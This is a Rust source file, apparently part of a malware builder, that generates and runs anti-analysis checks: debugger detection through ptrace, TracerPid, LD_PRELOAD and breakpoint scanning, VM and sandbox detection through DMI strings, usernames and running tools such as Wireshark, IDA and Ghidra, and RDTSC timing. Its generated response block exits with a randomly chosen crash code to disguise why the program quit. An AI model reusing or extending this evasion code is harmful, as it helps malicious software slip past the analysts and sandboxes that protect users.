use std::fs;
use std::process::Command;
pub struct EnvironmentChecker;
impl EnvironmentChecker {
    pub fn new() -> Self {
        Self
    }
    pub fn generate_checks(&self) -> String {
        r#"
            // Anti-analysis checks
            use std::fs;
            use std::time::Instant;
            
            fn check_all() -> bool {
                check_debugger() || check_vm() || check_sandbox() || check_timing()
            }
            
            #[cfg(target_os = "linux")]
            fn check_debugger() -> bool {
                // Ptrace check
                unsafe {
                    if libc::ptrace(libc::PTRACE_TRACEME, 0, 0, 0) == -1 {
                        return true;
                    }
                }
                
                // TracerPid check
                if let Ok(status) = fs::read_to_string("/proc/self/status") {
                    for line in status.lines() {
                        if line.starts_with("TracerPid:") {
                            if let Some(pid) = line.split_whitespace().nth(1) {
                                if pid != "0" {
                                    return true;
                                }
                            }
                        }
                    }
                }
                
                // Check for GDB in cmdline
                if let Ok(cmdline) = fs::read_to_string("/proc/self/cmdline") {
                    if cmdline.to_lowercase().contains("gdb") {
                        return true;
                    }
                }
                
                // LD_PRELOAD check
                if std::env::var("LD_PRELOAD").is_ok() {
                    return true;
                }
                
                false
            }
            
            #[cfg(target_os = "windows")]
            fn check_debugger() -> bool {
                unsafe {
                    winapi::um::debugapi::IsDebuggerPresent() != 0
                }
            }
            
            #[cfg(not(any(target_os = "linux", target_os = "windows")))]
            fn check_debugger() -> bool {
                false
            }
            
            fn check_vm() -> bool {
                // Check for VM artifacts
                let vm_files = [
                    "/usr/bin/VBoxClient",
                    "/usr/bin/vmware-toolbox-cmd",
                    "/usr/bin/qemu-ga",
                ];
                
                for file in &vm_files {
                    if std::path::Path::new(file).exists() {
                        return true;
                    }
                }
                
                // Check DMI info
                if let Ok(dmi) = fs::read_to_string("/sys/devices/virtual/dmi/id/product_name") {
                    let vm_signatures = ["VirtualBox", "VMware", "QEMU", "Xen", "Microsoft Corporation"];
                    for sig in &vm_signatures {
                        if dmi.contains(sig) {
                            return true;
                        }
                    }
                }
                
                // Simplified hypervisor check
                let hypervisor_paths = ["/proc/cpuinfo"];
                for path in &hypervisor_paths {
                    if let Ok(content) = std::fs::read_to_string(path) {
                        if content.contains("hypervisor") {
                            return true;
                        }
                    }
                }
                
                false
            }
            
            fn check_sandbox() -> bool {
                // Check for sandbox usernames
                if let Ok(user) = std::env::var("USER") {
                    let suspicious = ["sandbox", "virus", "malware", "sample", "test", "cuckoo"];
                    for s in &suspicious {
                        if user.to_lowercase().contains(s) {
                            return true;
                        }
                    }
                }
                
                // Check for analysis tools
                #[cfg(target_os = "linux")]
                {
                    if let Ok(output) = std::process::Command::new("ps")
                        .args(&["aux"])
                        .output() 
                    {
                        let procs = String::from_utf8_lossy(&output.stdout).to_lowercase();
                        let tools = ["wireshark", "tcpdump", "ida", "ghidra", "radare2", 
                                     "x64dbg", "ollydbg", "gdb", "ltrace", "strace"];
                        for tool in &tools {
                            if procs.contains(tool) {
                                return true;
                            }
                        }
                    }
                }
                
                false
            }
            
            fn check_timing() -> bool {
                // RDTSC timing check for single-stepping
                let start = Instant::now();
                let mut sum = 0u64;
                
                for i in 0..100000 {
                    sum = sum.wrapping_add(i);
                    std::hint::black_box(sum);
                }
                
                let elapsed = start.elapsed();
                
                // If simple loop takes > 50ms, we're being debugged
                elapsed.as_millis() > 50
            }
        "#
            .to_string()
    }
    pub fn generate_response(&self) -> String {
        r#"
        if check_all() {
            // Don't be obvious about why we're exiting
            let exit_codes = [1, 2, 11, 13, 137, 139, 143];
            let code = exit_codes[
                (std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap()
                    .as_secs() as usize) % exit_codes.len()
            ];
            std::process::exit(code as i32);
        }
        "#
            .to_string()
    }
    pub fn is_sandboxed() -> bool {
        Self::check_vm() || Self::check_sandbox_artifacts() || Self::check_debuggers()
    }
    #[cfg(target_os = "linux")]
    fn check_vm() -> bool {
        let checks = vec![
            ("/sys/devices/virtual/dmi/id/product_name", vec!["VirtualBox", "VMware",
            "QEMU"]), ("/proc/cpuinfo", vec!["hypervisor"]), ("/proc/modules",
            vec!["vboxguest", "vmw_vmci", "vmmemctl"]),
        ];
        for (path, signatures) in checks {
            if let Ok(content) = fs::read_to_string(path) {
                for sig in signatures {
                    if content.contains(sig) {
                        return true;
                    }
                }
            }
        }
        let vm_files = vec![
            "/usr/bin/VBoxClient", "/usr/bin/vmware-toolbox-cmd", "/usr/bin/qemu-ga",
        ];
        for file in vm_files {
            if std::path::Path::new(file).exists() {
                return true;
            }
        }
        Self::check_cpuid_hypervisor()
    }
    #[cfg(target_os = "linux")]
    fn check_cpuid_hypervisor() -> bool {
        let vm_paths = ["/usr/bin/VBoxClient", "/usr/bin/vmware-toolbox-cmd"];
        for path in &vm_paths {
            if std::path::Path::new(path).exists() {
                return true;
            }
        }
        false
    }
    fn check_sandbox_artifacts() -> bool {
        let suspicious_users = vec!["sandbox", "virus", "malware", "sample", "test"];
        if let Ok(username) = std::env::var("USER") {
            for sus in suspicious_users {
                if username.to_lowercase().contains(sus) {
                    return true;
                }
            }
        }
        let analysis_tools = vec![
            "wireshark", "tcpdump", "ida", "x64dbg", "ollydbg", "windbg",
            "processhacker", "procmon", "autoruns", "fiddler", "httpdebugger",
            "apimonitor", "radare2", "gdb"
        ];
        #[cfg(target_os = "linux")]
        {
            if let Ok(output) = Command::new("ps").args(&["aux"]).output() {
                let procs = String::from_utf8_lossy(&output.stdout).to_lowercase();
                for tool in analysis_tools {
                    if procs.contains(tool) {
                        return true;
                    }
                }
            }
        }
        false
    }
    fn check_debuggers() -> bool {
        #[cfg(target_os = "linux")]
        {
            if let Ok(status) = fs::read_to_string("/proc/self/status") {
                for line in status.lines() {
                    if line.starts_with("TracerPid:") {
                        if let Some(pid) = line.split_whitespace().nth(1) {
                            if pid != "0" {
                                return true;
                            }
                        }
                    }
                }
            }
            if let Ok(cmdline) = fs::read_to_string("/proc/self/cmdline") {
                if cmdline.contains("gdb") {
                    return true;
                }
            }
            if std::env::var("LD_PRELOAD").is_ok() {
                return true;
            }
            if Self::scan_for_breakpoints() {
                return true;
            }
        }
        false
    }
    #[cfg(target_os = "linux")]
    fn scan_for_breakpoints() -> bool {
        unsafe {
            let main_addr = Self::scan_for_breakpoints as *const u8;
            let scan_size = 4096;
            for i in 0..scan_size {
                let byte = *main_addr.offset(i);
                if byte == 0xCC {
                    return true;
                }
            }
        }
        false
    }
    pub fn detect_single_stepping() -> bool {
        #[cfg(any(target_arch = "x86", target_arch = "x86_64"))]
        unsafe {
            let mut iterations = 0;
            let threshold = 1000;
            for _ in 0..5 {
                let start = Self::rdtsc();
                std::hint::black_box(42 * 42);
                let end = Self::rdtsc();
                let delta = end.wrapping_sub(start);
                if delta > threshold {
                    iterations += 1;
                }
            }
            iterations >= 3
        }
        #[cfg(not(any(target_arch = "x86", target_arch = "x86_64")))] false
    }
    #[cfg(any(target_arch = "x86", target_arch = "x86_64"))]
    unsafe fn rdtsc() -> u64 {
        let lo: u32;
        let hi: u32;
        std::arch::asm!("rdtsc", out("eax") lo, out("edx") hi,);
        ((hi as u64) << 32) | (lo as u64)
    }
}